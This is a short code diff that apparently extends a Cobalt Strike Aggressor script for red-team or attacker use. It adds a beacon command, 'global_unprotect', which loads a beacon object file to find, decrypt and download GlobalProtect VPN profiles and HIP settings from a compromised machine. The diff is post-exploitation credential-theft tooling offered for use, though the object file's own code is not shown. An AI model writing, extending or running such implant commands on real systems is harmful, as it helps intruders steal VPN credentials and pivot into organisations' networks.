@@ -2014,3 +2014,15 @@ alias shutdown {
 	beacon_inline_execute($bid,  readbof($bid, "shutdown"), "go", $args);
 
 }
+
+alias global_unprotect {
+    beacon_inline_execute($1, readbof($1, "global_unprotect"), "go", $null);
+}
+
+beacon_command_register(
+    "global_unprotect",
+    "Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings"
+    "Usage: global_unprotect
+    
+    There are no arguments to this command"
+)
